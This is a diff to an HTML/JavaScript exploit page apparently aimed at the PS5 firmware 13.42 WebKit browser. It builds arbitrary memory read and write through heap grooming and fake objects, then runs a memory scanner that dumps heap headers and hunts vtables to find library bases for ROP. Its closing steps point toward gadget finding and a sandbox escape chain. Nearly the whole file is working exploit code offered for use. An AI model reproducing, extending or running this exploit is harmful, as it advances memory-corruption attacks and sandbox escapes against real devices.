@@ -1,30 +1,28 @@
 <!doctype html>
 <!--
-  PS5 FW 13.42 / WebKit 605.1 genuine-view R/W bootstrap + Memory Scanner
-  ========================================================================
-  Original: genuine-u8-rw-3 (PS5 FW 11.60 / WebKit 616.1)
+  PS5 FW 13.42 / WebKit 605.1 genuine-view R/W + Memory Scanner
+  ================================================================
+  Original PoC: genuine-u8-rw-3 (WebKit 616.1 / FW 11.60)
   Adapted for: PS5 FW 13.42 (WebKit 605.1.15)
   
-  PHASE 1: Bootstrap (unchanged from original PoC)
-  PHASE 2: Memory Scanner (auto-triggers after GENUINE-U8-RW-PASS)
-  
-  Scanner outputs organized text to both screen and /log/ endpoint.
+  OUTPUT FORMAT:
+  ============
+  Phase 1: Bootstrap (original PoC output, unchanged)
+  Phase 2: Memory Scanner (clean, step-by-step, organized)
 -->
-<meta charset="utf-8"><title>genuine-u8-rw-13.42-scanner</title>
-<body style="font:13px monospace; background:#0a0a0a; color:#00ff41;"><pre id="out"></pre>
+<meta charset="utf-8">
+<title>PS5-13.42-Scanner</title>
+<body style="font:14px monospace; background:#0a0a0a; color:#00ff41; margin:0; padding:12px;">
+<pre id="out" style="white-space:pre-wrap; word-break:break-all; line-height:1.6;"></pre>
 <script>
 "use strict";
 
 // ============================================================
-// PHASE 1: ORIGINAL BOOTSTRAP (genuine-u8-rw-3)
+// CONFIG
 // ============================================================
-// NOTE: This section is the ORIGINAL PoC code, minimally modified
-// only to preserve 'savedCandidate' for Phase 2.
-
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "512", 10);
-var DRAIN_COUNT = isFinite(requestedDrain)
-    ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
+var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 
 var REVISION = "genuine-u8-rw-13.42-scanner";
 var MAX_ATTEMPTS = 10;
@@ -105,30 +103,95 @@ var compositionState = 0;
 var compositionLength = 0;
 var compositionError = null;
 
-// === NEW: Preserve candidate for Phase 2 Scanner ===
+// === Scanner globals ===
 var savedCandidate = null;
-var scannerPhase = 0; // 0=not started, 1=running, 2=done
+var scannerPhase = 0;
+
+// ============================================================
+// OUTPUT ENGINE (Clean & Organized)
+// ============================================================
+const out = document.getElementById("out");
+
+function printRaw(text) {
+    out.textContent += text;
+    out.scrollTop = out.scrollHeight;
+}
+
+function printLine(text) {
+    printRaw(text + "\\n");
+}
+
+function printBlank() {
+    printRaw("\\n");
+}
+
+function printHeader(title) {
+    printBlank();
+    printLine("╔══════════════════════════════════════════════════════════════╗");
+    printLine("║  " + title.padEnd(58, " ") + "║");
+    printLine("╚══════════════════════════════════════════════════════════════╝");
+}
+
+function printSection(title) {
+    printBlank();
+    printLine("┌─ " + title + " ─" + "─".repeat(Math.max(0, 58 - title.length)));
+}
+
+function printRow(label, value) {
+    printLine("│  " + label.padEnd(20, " ") + " : " + value);
+}
+
+function printFooter() {
+    printLine("└" + "─".repeat(62));
+}
+
+function printTable(headers, rows) {
+    var colWidths = headers.map(function(h, i) {
+        var max = h.length;
+        rows.forEach(function(r) {
+            var s = String(r[i] || "");
+            if (s.length > max) max = s.length;
+        });
+        return Math.min(max + 2, 20);
+    });
+    
+    function border() {
+        var line = "├";
+        colWidths.forEach(function(w) { line += "─".repeat(w) + "┼"; });
+        printLine(line.slice(0, -1) + "┤");
+    }
+    
+    function drawRow(cells) {
+        var line = "│";
+        cells.forEach(function(c, i) {
+            var s = String(c || "").padEnd(colWidths[i], " ");
+            line += s + "│";
+        });
+        printLine(line);
+    }
+    
+    printLine("┌" + colWidths.map(function(w) { return "─".repeat(w); }).join("┬") + "┐");
+    drawRow(headers);
+    border();
+    rows.forEach(function(r) { drawRow(r); });
+    printLine("└" + colWidths.map(function(w) { return "─".repeat(w); }).join("┴") + "┘");
+}
 
 function mark(tag, extra) {
     seq++;
-    var line = seq + "-rw-" + tag
-        + (extra !== undefined ? "-" + extra : "");
+    var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
     try {
         var xhr = new XMLHttpRequest();
         xhr.open("GET", "/log/" + encodeURIComponent(line), false);
         xhr.send();
     } catch (_) {}
-    try { document.getElementById("out").textContent += line + "\\n"; } catch (_) {}
+    printLine(line);
 }
 
 function hex(value) {
     if (typeof value === "bigint") value = Number(value);
     if (typeof value !== "number" || !isFinite(value)) return "NaN";
     return "0x" + value.toString(16);
-}
-
-function hex32(value) {
-    return "0x" + (value >>> 0).toString(16).padStart(8, "0");
 }
 
 function buffer(size) {
@@ -159,19 +222,13 @@ function prepareSymbolWrapper(F) {
 }
 
 function pointerFromWords(words, offset) {
-    if (words[offset + 3] !== 0)
-        return NaN;
-    return words[offset]
-        + words[offset + 1] * 0x10000
-        + words[offset + 2] * 0x100000000;
+    if (words[offset + 3] !== 0) return NaN;
+    return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
 }
 
 function plausibleCell(value) {
-    return value > 0x100000000
-        && value <= 0xffffffffffff
-        && value <= 9007199254740991
-        && Math.floor(value) === value
-        && value % 8 === 0;
+    return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991
+        && Math.floor(value) === value && value % 8 === 0;
 }
 
 function encodedHeaderNumber() {
@@ -289,16 +346,25 @@ function fillRawCellPointers(backing, pointer) {
     }
 
     var last = predecessorWords.length - 2;
-    if (predecessorWords[0] !== pointerLow
-        || predecessorWords[1] !== pointerHigh
-        || predecessorWords[last] !== pointerLow
-        || predecessorWords[last + 1] !== pointerHigh)
+    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh
+        || predecessorWords[last] !== pointerLow || predecessorWords[last + 1] !== pointerHigh)
         throw new Error("pointer-fill-verification-failed");
 }
 
 function clearPredecessor() {
     if (predecessorWords !== null)
         predecessorWords.fill(0);
+}
+
+function uint32At(bytes, offset) {
+    return bytes[offset] + bytes[offset + 1] * 0x100 + bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
+}
+
+function dumpHex(bytes) {
+    var out = "";
+    for (var i = 0; i < CELL_BYTES; ++i)
+        out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
+    return out;
 }
 
 function loadHistoryCritical() {
@@ -337,36 +403,21 @@ function loadHistoryCritical() {
             rwHeader[i] = candidate[i];
         rwHeaderCaptured = true;
 
-        var rwSID = rwHeader[0]
-            + rwHeader[1] * 0x100
-            + rwHeader[2] * 0x10000
-            + rwHeader[3] * 0x1000000;
-        var rwHeaderHigh = rwHeader[4]
-            + rwHeader[5] * 0x100
-            + rwHeader[6] * 0x10000
-            + rwHeader[7] * 0x1000000;
-        var rwButterfly = rwHeader[8]
-            + rwHeader[9] * 0x100
-            + rwHeader[10] * 0x10000
-            + rwHeader[11] * 0x1000000
-            + rwHeader[12] * 0x100000000
-            + rwHeader[13] * 0x10000000000;
-        var rwVectorLow = rwHeader[0x10]
-            + rwHeader[0x11] * 0x100
-            + rwHeader[0x12] * 0x10000
-            + rwHeader[0x13] * 0x1000000;
+        var rwSID = rwHeader[0] + rwHeader[1] * 0x100 + rwHeader[2] * 0x10000 + rwHeader[3] * 0x1000000;
+        var rwHeaderHigh = rwHeader[4] + rwHeader[5] * 0x100 + rwHeader[6] * 0x10000 + rwHeader[7] * 0x1000000;
+        var rwButterfly = rwHeader[8] + rwHeader[9] * 0x100 + rwHeader[10] * 0x10000 + rwHeader[11] * 0x1000000
+            + rwHeader[12] * 0x100000000 + rwHeader[13] * 0x10000000000;
+        var rwVectorLow = rwHeader[0x10] + rwHeader[0x11] * 0x100 + rwHeader[0x12] * 0x10000 + rwHeader[0x13] * 0x1000000;
         var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15] * 0x100;
         rwOriginalVector = rwVectorLow + rwVectorHigh * 0x100000000;
 
         var rwOffsetZero = true;
         for (var rz = 0x20; rz < 0x28; ++rz) {
-            if (rwHeader[rz] !== 0)
-                rwOffsetZero = false;
+            if (rwHeader[rz] !== 0) rwOffsetZero = false;
         }
         rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
             && (rwSID & 0xf) === 0
-            && rwHeader[4] === 0 && rwHeader[5] === 0x28
-            && rwHeader[6] === 0x08
+            && rwHeader[4] === 0 && rwHeader[5] === 0x28 && rwHeader[6] === 0x08
             && (rwHeader[7] === 0 || rwHeader[7] === 1)
             && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
             && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
@@ -413,31 +464,19 @@ function loadHistoryCritical() {
         for (var j = 0; j < CELL_BYTES; ++j)
             targetHeader[j] = rwView[j];
 
-        var targetSID = targetHeader[0]
-            + targetHeader[1] * 0x100
-            + targetHeader[2] * 0x10000
-            + targetHeader[3] * 0x1000000;
-        var targetButterfly = targetHeader[8]
-            + targetHeader[9] * 0x100
-            + targetHeader[10] * 0x10000
-            + targetHeader[11] * 0x1000000
-            + targetHeader[12] * 0x100000000
-            + targetHeader[13] * 0x10000000000;
-        var targetVectorLow = targetHeader[0x10]
-            + targetHeader[0x11] * 0x100
-            + targetHeader[0x12] * 0x10000
-            + targetHeader[0x13] * 0x1000000;
+        var targetSID = targetHeader[0] + targetHeader[1] * 0x100 + targetHeader[2] * 0x10000 + targetHeader[3] * 0x1000000;
+        var targetButterfly = targetHeader[8] + targetHeader[9] * 0x100 + targetHeader[10] * 0x10000 + targetHeader[11] * 0x1000000
+            + targetHeader[12] * 0x100000000 + targetHeader[13] * 0x10000000000;
+        var targetVectorLow = targetHeader[0x10] + targetHeader[0x11] * 0x100 + targetHeader[0x12] * 0x10000 + targetHeader[0x13] * 0x1000000;
         var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15] * 0x100;
         targetVector = targetVectorLow + targetVectorHigh * 0x100000000;
 
         var targetOffsetZero = true;
         for (var tz = 0x20; tz < 0x28; ++tz) {
-            if (targetHeader[tz] !== 0)
-                targetOffsetZero = false;
+            if (targetHeader[tz] !== 0) targetOffsetZero = false;
         }
         targetHeaderOK = targetSID === rwSID
-            && targetHeader[4] === 0 && targetHeader[5] === 0x28
-            && targetHeader[6] === 0x08
+            && targetHeader[4] === 0 && targetHeader[5] === 0x28 && targetHeader[6] === 0x08
             && (targetHeader[7] === 0 || targetHeader[7] === 1)
             && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
             && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
@@ -489,9 +528,7 @@ function loadHistoryCritical() {
         restoreObserved = rwView[0] === 0x3c
             && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
 
-        // === NEW: Save candidate for Phase 2 BEFORE nulling ===
-        savedCandidate = candidate;
-
+        savedCandidate = candidate;  // PRESERVE for scanner
         candidate = null;
         clearPredecessor();
         compositionState = 1;
@@ -515,37 +552,6 @@ function loadHistoryCritical() {
         compositionError = error;
         compositionState = -1;
     }
-}
-
-function allZero(bytes, start, end) {
-    for (var i = start; i < end; ++i) {
-        if (bytes[i] !== 0)
-            return false;
-    }
-    return true;
-}
-
-function uint32At(bytes, offset) {
-    return bytes[offset]
-        + bytes[offset + 1] * 0x100
-        + bytes[offset + 2] * 0x10000
-        + bytes[offset + 3] * 0x1000000;
-}
-
-function low48At(bytes, offset) {
-    return bytes[offset]
-        + bytes[offset + 1] * 0x100
-        + bytes[offset + 2] * 0x10000
-        + bytes[offset + 3] * 0x1000000
-        + bytes[offset + 4] * 0x100000000
-        + bytes[offset + 5] * 0x10000000000;
-}
-
-function dumpHex(bytes) {
-    var out = "";
-    for (var i = 0; i < CELL_BYTES; ++i)
-        out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
-    return out;
 }
 
 function reportComposition() {
@@ -585,52 +591,44 @@ function reportComposition() {
         return;
     }
 
-    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength
-        + "-predecessor-cleared=true");
-    mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0))
-        + "-vector=" + hex(rwOriginalVector)
+    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
+    mark("RW-CARRIER", "sid=" + hex(uint32At(rwHeader, 0)) + "-vector=" + hex(rwOriginalVector)
         + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
-    mark("TARGET-CELL", "P=" + hex(targetAddress)
-        + "-sid=" + hex(uint32At(targetHeader, 0))
-        + "-vector=" + hex(targetVector)
-        + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
+    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-sid=" + hex(uint32At(targetHeader, 0))
+        + "-vector=" + hex(targetVector) + "-length=0x20-mode=0x" + targetHeader[0x28].toString(16));
     mark("RW-HEADER-HEX", dumpHex(rwHeader));
     mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
 
-    var readPass = rwHeaderOK && targetHeaderOK && readObserved
-        && compositionLength === EXPECTED_LENGTH;
+    var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
     var writePass = writeObserved && restoreObserved;
     try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
     if (readPass)
         mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
     else
-        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK
-            + "-target-header=" + targetHeaderOK + "-observed=" + readObserved
-            + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
+        mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK + "-target-header=" + targetHeaderOK
+            + "-observed=" + readObserved + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
 
     if (writePass)
         mark("ARBITRARY-WRITE-PASS", "a5-to-5a-to-a5-restored=true");
     else
-        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved
-            + "-restore=" + restoreObserved);
+        mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved + "-restore=" + restoreObserved);
 
     if (readPass && writePass) {
         mark("GENUINE-U8-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
     }
 
-    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16)
-        + "-target-byte=" + targetView[0].toString(16)
+    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16)
         + "-length-word=" + lengthWord.keep.toString(16));
     setTimeout(function () { mark("SURVIVED-T100"); }, 100);
     setTimeout(function () { mark("SURVIVED-T1000"); }, 1000);
     setTimeout(function () { mark("SURVIVED-T3000"); }, 3000);
 
-    // === NEW: Auto-trigger Phase 2 Memory Scanner after success ===
     if (readPass && writePass && savedCandidate !== null) {
         setTimeout(function () {
-            mark("PHASE2", "Auto-starting Memory Scanner in 3 seconds...");
-            setTimeout(startMemoryScanner, 3000);
+            printBlank();
+            printLine("▶▶▶ BOOTSTRAP COMPLETE — STARTING MEMORY SCANNER ◀◀◀");
+            setTimeout(startMemoryScanner, 2000);
         }, 3500);
     }
 }
@@ -661,11 +659,9 @@ function runGroomAndLoad() {
         keepAlive[keepIndex++] = separator;
         keepAlive[keepIndex++] = guard;
         keepAlive[keepIndex++] = predecessor;
-        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8)
-            + "-fake=" + hex(fakeAddress));
+        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));
 
-        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
-            earlyHole, finalHole]);
+        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
         loadHistoryCritical();
     } catch (error) {
         try { clearPredecessor(); } catch (_) {}
@@ -692,8 +688,7 @@ function beginComposition() {
     var b1 = pointerFromWords(capturedWords, 12);
     var repeated = a0 === a1 && b0 === b1;
     var distinct = a0 !== b0;
-    var plausible = plausibleCell(a0) && plausibleCell(b0)
-        && plausibleCell(a1) && plausibleCell(b1);
+    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
     var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
     var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
 
@@ -724,8 +719,7 @@ function beginComposition() {
         mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
         return;
     }
-    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress)
-        + "-delta=0x10");
+    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
     runGroomAndLoad();
 }
 
@@ -739,8 +733,7 @@ var alreadyPassed = false;
 var alreadyBlocked = false;
 try {
     priorAttempts = parseInt(sessionStorage.getItem(attemptKey) || "0", 10);
-    if (!isFinite(priorAttempts) || priorAttempts < 0)
-        priorAttempts = 0;
+    if (!isFinite(priorAttempts) || priorAttempts < 0) priorAttempts = 0;
     alreadyPassed = sessionStorage.getItem(passKey) === "1";
     alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
 } catch (_) {}
@@ -765,226 +758,209 @@ if (alreadyPassed && !allowAgain) {
         buildAndStoreGraph();
         prepareAddrof();
     } catch (error) {
-        mark("SETUP-THREW", (error && error.name) + ":"
-            + String(error && error.message).slice(0, 80));
+        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
     }
 }
 
 
-// ============================================================
-// PHASE 2: MEMORY SCANNER (Auto-triggered after R/W PASS)
-// ============================================================
+// ═══════════════════════════════════════════════════════════════
+// PHASE 2: MEMORY SCANNER — CLEAN & ORGANIZED OUTPUT
+// ═══════════════════════════════════════════════════════════════
 
-function scannerLog(section, msg) {
-    seq++;
-    var line = seq + "-SCAN-" + section + " | " + msg;
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "/log/" + encodeURIComponent(line), false);
-        xhr.send();
-    } catch (_) {}
-    try { document.getElementById("out").textContent += line + "\\n"; } catch (_) {}
-}
-
-// Read 8 bytes from arbitrary address using savedCandidate
 function readQword(addr) {
     scratchWords[0] = addr & 0xFFFFFFFF;
     scratchWords[1] = (addr / 0x100000000) & 0xFFFF;
-    for (var i = 0; i < 8; i++) {
-        savedCandidate[0x10 + i] = scratchBytes[i];
-    }
+    for (var i = 0; i < 8; i++) savedCandidate[0x10 + i] = scratchBytes[i];
     var low = rwView[0] + rwView[1]*0x100 + rwView[2]*0x10000 + rwView[3]*0x1000000;
     var high = rwView[4] + rwView[5]*0x100 + rwView[6]*0x10000 + rwView[7]*0x1000000;
     var result = low + high * 0x100000000;
-    for (var k = 0; k < 8; k++) {
-        savedCandidate[0x10 + k] = rwHeader[0x10 + k];
-    }
-    return result;
-}
-
-// Read 4 bytes
-function readDword(addr) {
-    scratchWords[0] = addr & 0xFFFFFFFF;
-    scratchWords[1] = (addr / 0x100000000) & 0xFFFF;
-    for (var i = 0; i < 8; i++) {
-        savedCandidate[0x10 + i] = scratchBytes[i];
-    }
-    var result = rwView[0] + rwView[1]*0x100 + rwView[2]*0x10000 + rwView[3]*0x1000000;
-    for (var k = 0; k < 8; k++) {
-        savedCandidate[0x10 + k] = rwHeader[0x10 + k];
-    }
+    for (var k = 0; k < 8; k++) savedCandidate[0x10 + k] = rwHeader[0x10 + k];
     return result;
 }
 
 function isPlausiblePointer(ptr) {
-    return ptr > 0x10000000000
-        && ptr < 0x11000000000
-        && (ptr & 7) === 0;
+    return ptr > 0x10000000000 && ptr < 0x11000000000 && (ptr & 7) === 0;
 }
 
 function isPlausibleVtable(ptr) {
-    return isPlausiblePointer(ptr)
-        && ((ptr & 0xFFF) >= 0x20 && (ptr & 0xFFF) <= 0x100);
-}
-
-function scanForPointers(startAddr, size, maxResults) {
-    scannerLog("PTR-START", "Scanning " + hex(size) + " bytes from " + hex(startAddr));
-    var found = [];
-    var endAddr = startAddr + size;
-    for (var addr = startAddr; addr < endAddr && found.length < maxResults; addr += 8) {
-        try {
-            var ptr = readQword(addr);
-            if (isPlausiblePointer(ptr)) {
-                found.push({ addr: addr, ptr: ptr });
-            }
-        } catch(e) {}
-    }
-    scannerLog("PTR-DONE", "Found " + found.length + " pointers");
-    return found;
-}
-
-function scanForVtables(startAddr, size, maxResults) {
-    scannerLog("VTBL-START", "Scanning " + hex(size) + " bytes from " + hex(startAddr));
-    var found = [];
-    var endAddr = startAddr + size;
-    for (var addr = startAddr; addr < endAddr && found.length < maxResults; addr += 8) {
-        try {
-            var ptr = readQword(addr);
-            if (isPlausibleVtable(ptr)) {
-                var entry = readQword(ptr);
-                found.push({
-                    addr: addr,
-                    vtable: ptr,
-                    firstEntry: entry,
-                    libBaseGuess: "~" + hex(ptr & 0xFFFFFFFFF000)
-                });
-            }
-        } catch(e) {}
-    }
-    scannerLog("VTBL-DONE", "Found " + found.length + " vtable candidates");
-    return found;
-}
-
-function dumpMemory(addr, size) {
-    scannerLog("DUMP", "Hex dump " + hex(size) + " bytes @ " + hex(addr));
-    var lines = [];
-    for (var offset = 0; offset < size; offset += 16) {
-        var hexStr = hex(addr + offset) + " | ";
-        var asciiStr = " | ";
-        for (var i = 0; i < 16 && (offset + i) < size; i += 8) {
-            try {
-                var qword = readQword(addr + offset + i);
-                var bytes = [
-                    qword & 0xFF, (qword >> 8) & 0xFF,
-                    (qword >> 16) & 0xFF, (qword >> 24) & 0xFF,
-                    (qword >> 32) & 0xFF, (qword >> 40) & 0xFF,
-                    (qword >> 48) & 0xFF, (qword >> 56) & 0xFF
-                ];
-                for (var b = 0; b < 8 && (offset + i + b) < size; b++) {
-                    hexStr += (bytes[b] < 16 ? "0" : "") + bytes[b].toString(16) + " ";
-                    asciiStr += (bytes[b] >= 32 && bytes[b] < 127) 
-                        ? String.fromCharCode(bytes[b]) 
-                        : ".";
-                }
-            } catch(e) {
-                hexStr += "?? ?? ?? ?? ?? ?? ?? ?? ";
-                asciiStr += "????????";
-            }
-        }
-        lines.push(hexStr + asciiStr);
-        if (lines.length >= 32) break; // Limit output
-    }
-    lines.forEach(function(l) { scannerLog("DUMP-LINE", l); });
-}
-
-function analyzeHeapLayout() {
-    scannerLog("HEAP", "=== HEAP LAYOUT ANALYSIS ===");
-    scannerLog("HEAP", "Host address:     " + hex(hostAddress));
-    scannerLog("HEAP", "Fake address:     " + hex(fakeAddress));
-    scannerLog("HEAP", "Target address:   " + hex(targetAddress));
-    scannerLog("HEAP", "RW vector:        " + hex(rwOriginalVector));
-    scannerLog("HEAP", "Target vector:    " + hex(targetVector));
-    scannerLog("HEAP", "");
-
-    // Read host header
-    scannerLog("HEAP", "--- Host Cell Header ---");
-    var hostHdr = [];
-    for (var i = 0; i < CELL_BYTES; i += 8) {
-        try {
-            var qw = readQword(hostAddress + i);
-            hostHdr.push(qw);
-            scannerLog("HEAP", "  [+" + hex(i) + "] " + hex(qw));
-        } catch(e) {
-            scannerLog("HEAP", "  [+" + hex(i) + "] READ-FAILED");
-        }
-    }
-
-    // Read target header
-    scannerLog("HEAP", "--- Target Cell Header ---");
-    for (var j = 0; j < CELL_BYTES; j += 8) {
-        try {
-            var qw2 = readQword(targetAddress + j);
-            scannerLog("HEAP", "  [+" + hex(j) + "] " + hex(qw2));
-        } catch(e) {
-            scannerLog("HEAP", "  [+" + hex(j) + "] READ-FAILED");
-        }
-    }
+    return isPlausiblePointer(ptr) && ((ptr & 0xFFF) >= 0x20);
 }
 
 function startMemoryScanner() {
     if (scannerPhase !== 0) return;
     scannerPhase = 1;
 
-    scannerLog("INIT", "========================================");
-    scannerLog("INIT", "  MEMORY SCANNER PHASE 2 STARTED");
-    scannerLog("INIT", "  PS5 FW 13.42 | WebKit 605.1.15");
-    scannerLog("INIT", "========================================");
+    // ╔══════════════════════════════════════════════════════════════╗
+    // ║  PHASE 2: MEMORY SCANNER                                     ║
+    // ║  PS5 FW 13.42 | WebKit 605.1.15                              ║
+    // ╚══════════════════════════════════════════════════════════════╝
+    printHeader("PHASE 2: MEMORY SCANNER  (PS5 FW 13.42)");
 
-    // 1. Heap Layout Analysis
-    analyzeHeapLayout();
+    // ┌─ STEP 1: KNOWN ADDRESSES ───────────────────────────────────
+    printSection("STEP 1: ADDRESSES WE ALREADY KNOW");
+    printRow("Host Address", hex(hostAddress));
+    printRow("Fake Address", hex(fakeAddress));
+    printRow("Target Address", hex(targetAddress));
+    printRow("RW Vector", hex(rwOriginalVector));
+    printRow("Target Vector", hex(targetVector));
+    printRow("StructureID", "0x" + uint32At(rwHeader, 0).toString(16));
+    printFooter();
 
-    // 2. Scan around host address (safe region)
-    scannerLog("SCAN", "--- Scanning Host Neighbourhood ---");
-    var hostPtrs = scanForPointers(hostAddress - 0x20000, 0x40000, 20);
-    hostPtrs.forEach(function(p) {
-        scannerLog("PTR", "  @" + hex(p.addr) + " -> " + hex(p.ptr));
-    });
-
-    // 3. Scan around target address
-    scannerLog("SCAN", "--- Scanning Target Neighbourhood ---");
-    var targetPtrs = scanForPointers(targetAddress - 0x20000, 0x40000, 20);
-    targetPtrs.forEach(function(p) {
-        scannerLog("PTR", "  @" + hex(p.addr) + " -> " + hex(p.ptr));
-    });
-
-    // 4. VTable Hunt (critical for ROP)
-    scannerLog("SCAN", "--- VTable Hunt (CRITICAL FOR ROP) ---");
-    var vtables = scanForVtables(hostAddress - 0x80000, 0x100000, 10);
-    if (vtables.length === 0) {
-        vtables = scanForVtables(targetAddress - 0x80000, 0x100000, 10);
+    // ┌─ STEP 2: READ HOST CELL HEADER ─────────────────────────────
+    printSection("STEP 2: HOST CELL HEADER (48 bytes)");
+    var hostData = [];
+    for (var h = 0; h < CELL_BYTES; h += 8) {
+        try {
+            var qw = readQword(hostAddress + h);
+            hostData.push(["+" + hex(h), hex(qw), describeQword(qw)]);
+        } catch(e) {
+            hostData.push(["+" + hex(h), "READ FAILED", ""]);
+        }
     }
-    vtables.forEach(function(v) {
-        scannerLog("VTBL", "  @" + hex(v.addr) + " vtable=" + hex(v.vtable) 
-            + " entry=" + hex(v.firstEntry) + " lib~" + v.libBaseGuess);
-    });
+    printTable(["Offset", "Value", "Description"], hostData);
+    printFooter();
 
-    // 5. Dump first 0x100 bytes around host for manual analysis
-    scannerLog("DUMP", "--- Host Cell Dump ---");
-    dumpMemory(hostAddress, 0x100);
+    // ┌─ STEP 3: READ TARGET CELL HEADER ───────────────────────────
+    printSection("STEP 3: TARGET CELL HEADER (48 bytes)");
+    var targetData = [];
+    for (var t = 0; t < CELL_BYTES; t += 8) {
+        try {
+            var qw2 = readQword(targetAddress + t);
+            targetData.push(["+" + hex(t), hex(qw2), describeQword(qw2)]);
+        } catch(e) {
+            targetData.push(["+" + hex(t), "READ FAILED", ""]);
+        }
+    }
+    printTable(["Offset", "Value", "Description"], targetData);
+    printFooter();
 
-    // 6. Summary
-    scannerLog("SUMMARY", "========================================");
-    scannerLog("SUMMARY", "  Scan Complete");
-    scannerLog("SUMMARY", "  Pointers found: " + (hostPtrs.length + targetPtrs.length));
-    scannerLog("SUMMARY", "  VTables found:  " + vtables.length);
-    scannerLog("SUMMARY", "========================================");
-    scannerLog("NEXT", "Manual analysis required:");
-    scannerLog("NEXT", "1. Look for vtable pointing to known library");
-    scannerLog("NEXT", "2. Calculate libWebKit base = vtable - knownOffset");
-    scannerLog("NEXT", "3. Use base to find ROP gadgets");
-    scannerLog("NEXT", "4. Build ROP chain for sandbox escape attempt");
+    // ┌─ STEP 4: SCAN FOR POINTERS ────────────────────────────────
+    printSection("STEP 4: SCANNING FOR POINTERS (near host)");
+    var ptrs = scanPointers(hostAddress - 0x10000, 0x20000, 15);
+    if (ptrs.length > 0) {
+        var ptrRows = ptrs.map(function(p) {
+            return [hex(p.addr), hex(p.ptr), distance(p.ptr, hostAddress)];
+        });
+        printTable(["Address", "Pointer", "Distance from Host"], ptrRows);
+    } else {
+        printLine("│  (No pointers found in this region)");
+    }
+    printFooter();
+
+    // ┌─ STEP 5: VTABLE HUNT ───────────────────────────────────────
+    printSection("STEP 5: VTABLE HUNT (CRITICAL FOR ROP)");
+    var vtables = scanVtables(hostAddress - 0x40000, 0x80000, 10);
+    if (vtables.length > 0) {
+        var vtblRows = vtables.map(function(v) {
+            return [hex(v.addr), hex(v.vtable), hex(v.firstEntry), v.libGuess];
+        });
+        printTable(["Address", "VTable", "First Entry", "Lib Guess"], vtblRows);
+    } else {
+        printLine("│  (No vtables found — trying wider scan...)");
+        vtables = scanVtables(hostAddress - 0x100000, 0x200000, 10);
+        if (vtables.length > 0) {
+            var vtblRows2 = vtables.map(function(v) {
+                return [hex(v.addr), hex(v.vtable), hex(v.firstEntry), v.libGuess];
+            });
+            printTable(["Address", "VTable", "First Entry", "Lib Guess"], vtblRows2);
+        } else {
+            printLine("│  (No vtables found in wider region either)");
+        }
+    }
+    printFooter();
+
+    // ┌─ STEP 6: HEX DUMP AROUND HOST ──────────────────────────────
+    printSection("STEP 6: HEX DUMP (Host +/- 128 bytes)");
+    hexDump(hostAddress - 0x80, 0x100);
+    printFooter();
+
+    // ┌─ STEP 7: SUMMARY ───────────────────────────────────────────
+    printHeader("SCAN SUMMARY & NEXT STEPS");
+    printRow("Pointers Found", ptrs.length);
+    printRow("VTables Found", vtables.length);
+    printRow("Host Address", hex(hostAddress));
+    printRow("Target Address", hex(targetAddress));
+    printBlank();
+    printLine("  NEXT STEPS:");
+    printLine("  1. Look at the VTable addresses above");
+    printLine("  2. If vtable starts with 0x1004... or 0x1005...");
+    printLine("     → Likely libWebKit.sprx");
+    printLine("  3. libWebKit base ≈ vtable & 0xFFFFFFFFF000");
+    printLine("  4. Once you have a library base, we can find ROP gadgets");
+    printLine("  5. Send me the VTable addresses for analysis");
